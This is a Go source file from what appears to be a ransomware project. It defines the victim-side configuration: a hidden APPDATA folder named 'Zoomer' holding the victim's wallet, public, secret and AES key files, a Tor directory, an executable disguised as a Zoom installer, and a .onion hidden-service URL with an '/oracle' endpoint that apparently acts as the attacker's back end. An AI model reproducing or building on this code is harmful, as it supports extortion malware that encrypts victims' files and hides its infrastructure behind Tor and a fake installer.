package victim

import (
    "os"

    "github.com/sug0/sr-ransomware/go/errors"
)

const pkg = "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"

var (
    workDir = os.Getenv("APPDATA") + `\Zoomer`

    victimEthereumWallet = workDir + `\a.flu`
    victimPublicKey      = workDir + `\b.flu`
    victimSecretKey      = workDir + `\c.flu`
    victimAESKey         = workDir + `\d.flu`

    torDirectory  = workDir + `\Tor`
    zoomInstaller = workDir + `\ZoomInstaller.exe`
)

const (
    hiddenServiceBase   = "http://w3unwrwgweysy3tzxjtuwnef5kaq637i2v5tn6pyshd5w73ncif537ad.onion"
    hiddenServiceOracle = hiddenServiceBase + "/oracle"
)

var (
    errNotFullWrite = errors.New(pkg, "failed to write all data")
)
